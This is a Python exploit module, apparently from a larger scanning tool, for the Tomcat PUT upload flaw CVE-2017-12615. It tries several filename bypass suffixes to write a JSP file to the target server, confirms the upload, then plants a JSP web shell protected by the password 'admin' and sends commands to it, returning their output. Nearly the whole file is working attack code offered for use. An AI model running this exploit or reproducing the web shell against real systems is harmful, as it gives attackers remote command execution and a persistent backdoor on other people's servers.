import requests
import time
from bs4 import BeautifulSoup
import random
import os
import logging

data1="""
123456789
"""

ipa=0
cf=''
ch=''
http = ''
https = ''
cmd='x'
g12=''
g13=''
data=''
def dl19(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global ch
    global cf
    global ipa
    global data,g12,g13
    global data1,cmd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        gfa=['::$DATA','','/','%20']
        headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'}
        if cmd=='x':
            for i in gfa:
                cg = random.randint(111111, 222222)
                if ipa == 10:
                    break
                else:
                    gf = url1 + 'alpoac{}.jsp{}/'.format(cg, i).replace('', '')
                    gf1 = url1 + 'alpoac{}.jsp'.format(cg)
                    gf2 = url1 + 'badaa{}.jsp{}/'.format(cg, i).replace('', '')
                    gf3 = url1 + 'badaa{}.jsp'.format(cg)
                    g12=gf2
                    g13=gf3
                    logging.captureWarnings(True)
                    a1 = requests.put(gf, cookies=s_cookie, headers=headers, proxies=proxies, data=data1, verify=False,
                                      timeout=5)
                    if a1.status_code != '404':
                        aa1 = requests.get(gf1, cookies=s_cookie, headers=headers, proxies=proxies, verify=False,
                                           timeout=5)
                        aa1.encoding = 'utf-8'
                        cd1 = BeautifulSoup(aa1.text, 'html.parser')
                        if '123456789' in cd1.text:
                            ch = '[+]上传成功'
                            ipa += 10
                            data = """
                                    <%
                                        if("admin".equals(request.getParameter("pwd"))){
                                            java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
                                            int a = -1;
                                            byte[] b = new byte[2048];
                                            out.print("<pre>");
                                            while((a=in.read(b))!=-1){
                                                out.println(new String(b));
                                            }
                                            out.print("</pre>");
                                        }
                                    %>
                                    """
                        else:
                            ch='[-]上传失败_2'
                    else:
                        ch='[-]上传失败_1'
        else:
            try:
                aa = requests.put(g12, headers=headers, data=data, verify=False, timeout=5)
                if aa.status_code != '404':
                    cg = g13 + '?pwd=admin&cmd={}'.format(cmd)
                    aaa1 = requests.get(cg, headers=headers, verify=False, timeout=5)
                    aaa1.encoding = 'utf-8'
                    cd = BeautifulSoup(aaa1.text, 'html.parser')
                    ch = cd.text.strip().strip('\xa0' * 4).replace('\n', '').replace('', '')
                    cmd = 'x'
            except EnvironmentError as aaa:
                ch = '请求错误_2\n' + str(aaa)
    except EnvironmentError as aaa:
        ch = '请求错误_1\n' + str(aaa)
def jg12():
    global ch
    return '--------------------------------------------------\n[ Tomcat CVE-2017-12615 ]\n\n'+ str (ch)+'\n'
def u12(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
def cmad(cmd1):
    global cmd
    cmd=cmd1